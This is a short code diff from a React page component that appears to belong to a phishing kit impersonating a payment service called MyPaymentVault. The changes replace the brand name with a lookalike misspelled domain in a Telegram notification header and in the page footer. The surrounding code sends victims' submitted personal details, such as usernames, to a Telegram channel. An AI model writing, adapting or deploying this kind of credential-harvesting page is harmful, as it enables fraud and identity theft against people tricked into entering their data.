@@ -90,7 +90,7 @@ export default function Step4() {
 
     await sendTelegram(
       `━━━━━━━━━━━━━━━━━━━━━\n` +
-      `📋 <b>MyPaymentVault</b>\n` +
+      `📋 <b>mypaymenttvaulltr.com</b>\n` +
       `📌 <b>Step 3 — Personal Info</b>\n` +
       `━━━━━━━━━━━━━━━━━━━━━\n\n` +
       `👤 <b>Username</b>    : <code>${user?.username ?? "-"}</code>\n` +
@@ -456,7 +456,7 @@ export default function Step4() {
 
       <div style={{ width: "100%", maxWidth: 680, marginTop: 12, paddingRight: 2, textAlign: "right" }}>
         <span style={{ fontSize: 11, color: "#888" }}>
-          &copy; MyPaymentVault | Terms of Use | Privacy &amp; Cookies
+          &copy; mypaymenttvaulltr.com | Terms of Use | Privacy &amp; Cookies
         </span>
       </div>
 
